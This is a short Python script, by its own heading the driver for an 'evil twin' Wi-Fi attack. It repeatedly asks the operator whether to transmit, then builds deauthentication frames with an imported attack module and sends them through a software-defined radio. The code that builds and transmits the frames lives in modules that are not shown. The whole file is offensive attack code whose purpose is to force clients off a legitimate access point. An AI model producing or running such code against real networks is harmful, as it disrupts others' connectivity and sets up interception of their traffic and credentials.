# code to run the evil twin attack
from attack import frames
from SDRtransmitTCP import transmitData

def transmit_frame_deauth():
    while(True):
        choice = None
        while(True):
            choice = input("transmit deauth frame? (y/n): ")
            if choice in ["y", "n"]:
                break
            else:
                print("Invalid choice. Please enter a valid number.")
        
        if choice=="y":
            raw_frame = frames.start_deauthentication_frame_generator()
            print("transmitting now")
            transmitData(raw_frame)
        else:
            break



